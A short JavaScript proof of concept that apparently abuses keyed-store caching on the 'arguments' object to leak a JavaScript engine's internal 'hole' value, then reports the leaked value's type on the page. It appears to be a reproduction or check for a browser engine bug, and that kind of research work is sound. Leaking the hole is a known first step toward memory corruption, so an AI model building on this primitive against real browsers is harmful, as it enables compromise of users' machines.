function set_keyed_prop(arr, key, val) { arr[key] = val; }

function leak_hole() {
    let store_mode = [];
    for(let i = 0; i < 10; i++) set_keyed_prop(arguments, "foo", 1);
    set_keyed_prop(store_mode, 0, 1);
    set_keyed_prop(arguments, arguments.length, 1);
    return arguments[arguments.length+1];
}

const hole = leak_hole();
document.body.textContent = 'hole type: ' + typeof hole + ' | value: ' + hole + ' | is undefined: ' + (hole === undefined);
